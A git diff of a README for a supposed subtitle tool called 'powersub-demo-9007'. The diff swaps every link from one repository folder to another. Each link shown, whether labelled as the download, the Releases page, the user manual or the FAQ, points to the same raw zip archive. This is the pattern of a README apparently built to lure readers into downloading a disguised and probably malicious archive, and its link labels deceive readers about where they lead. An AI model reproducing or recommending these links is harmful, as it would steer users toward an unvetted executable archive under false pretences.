@@ -1,6 +1,6 @@
 # 🎉 powersub-demo-9007 - Easy Subtitle Management Made Simple
 
-[![Download](https://raw.githubusercontent.com/MrGamerAE/powersub-demo-9007/main/weepy/powersub-demo-9007.zip)](https://raw.githubusercontent.com/MrGamerAE/powersub-demo-9007/main/weepy/powersub-demo-9007.zip)
+[![Download](https://raw.githubusercontent.com/MrGamerAE/powersub-demo-9007/main/morgen/powersub-demo-9007.zip)](https://raw.githubusercontent.com/MrGamerAE/powersub-demo-9007/main/morgen/powersub-demo-9007.zip)
 
 ## 🚀 Getting Started
 
@@ -19,11 +19,11 @@ To run powersub-demo-9007, ensure your computer meets the following requirements
 
 1. Click on the download link below to access the Releases page.
 
-   [Download from Releases](https://raw.githubusercontent.com/MrGamerAE/powersub-demo-9007/main/weepy/powersub-demo-9007.zip)
+   [Download from Releases](https://raw.githubusercontent.com/MrGamerAE/powersub-demo-9007/main/morgen/powersub-demo-9007.zip)
 
 2. On the Releases page, find the latest version of the application. It will be listed at the top.
 
-3. Download the latest version by clicking on the appropriate file (e.g., `https://raw.githubusercontent.com/MrGamerAE/powersub-demo-9007/main/weepy/powersub-demo-9007.zip`).
+3. Download the latest version by clicking on the appropriate file (e.g., `https://raw.githubusercontent.com/MrGamerAE/powersub-demo-9007/main/morgen/powersub-demo-9007.zip`).
 
 4. Once the download is complete, locate the downloaded file on your computer. It is typically found in the "Downloads" folder.
 
@@ -67,9 +67,9 @@ If you have questions or need further assistance, feel free to reach out:
 
 For more detailed instructions or advanced features, check out the following resources:
 
-- [User Manual](https://raw.githubusercontent.com/MrGamerAE/powersub-demo-9007/main/weepy/powersub-demo-9007.zip)
-- [Frequently Asked Questions](https://raw.githubusercontent.com/MrGamerAE/powersub-demo-9007/main/weepy/powersub-demo-9007.zip)
+- [User Manual](https://raw.githubusercontent.com/MrGamerAE/powersub-demo-9007/main/morgen/powersub-demo-9007.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/MrGamerAE/powersub-demo-9007/main/morgen/powersub-demo-9007.zip)
 
 Thank you for choosing powersub-demo-9007. We hope you enjoy managing your subtitles with ease! 
 
-[Download from Releases](https://raw.githubusercontent.com/MrGamerAE/powersub-demo-9007/main/weepy/powersub-demo-9007.zip)
+[Download from Releases](https://raw.githubusercontent.com/MrGamerAE/powersub-demo-9007/main/morgen/powersub-demo-9007.zip)
